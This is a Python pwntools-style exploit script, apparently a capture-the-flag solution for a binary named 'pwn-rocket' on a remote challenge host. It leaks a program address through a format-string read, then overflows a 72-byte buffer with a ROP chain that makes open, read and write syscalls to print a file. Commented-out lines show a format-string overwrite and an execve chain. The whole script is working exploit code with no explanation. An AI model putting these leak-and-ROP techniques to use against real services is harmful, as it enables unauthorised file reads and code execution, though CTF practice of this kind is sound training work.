#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5

from rootkit import *
from time import sleep

exe  = context.binary = ELF('./pwn-rocket')
host = args.HOST or '0.cloud.chals.io'
port = int(args.PORT or 13163)

gdbscript = '''
tbreak main
b *vuln+212
continue
'''.format(**locals())

libc=SetupLibcELF()
io = start()

# payload = fmtstr_payload(8, {exe.got.printf, 0xdeadbeef}, write_size='short')

re()
sl(b"%6$p")
reu(b"<<< Welcome: ")
exe.address=GetInt(rl())[0]-0x10e0
pb()
payload = flat([

	b"A"*72,
	0xdeadbeef

])
re()

rop=flat([
                gadget("pop rax; ret"),
                2,
                gadget("pop rdi; ret"),
                exe.address+0x2db8,
                pop("rsi", 0),
                gadget("syscall; ret"),
                gadget("pop rax; ret"),
                0,
                gadget("pop rdi; ret"),
                3,
                pop("rsi",exe.address+0x5180),
                gadget("pop rdx; ret"),
                100,
                gadget("syscall; ret"),
                gadget("pop rax; ret"),
                1,
                gadget("pop rdi; ret"),
                1,
                pop("rsi",exe.address+0x5180),
                gadget("pop rdx; ret"),
                100,
                gadget("syscall; ret"),
    
])

# sl(b"A"*72 + pop("rax", 0x3b) + pop("rdi", exe.address+0x2d61) + pop("rdx", 0x0) + pop("rsi", 0x0) + gadget("syscall"))
sl(b"A"*72 + rop)
print(re())
io.interactive()
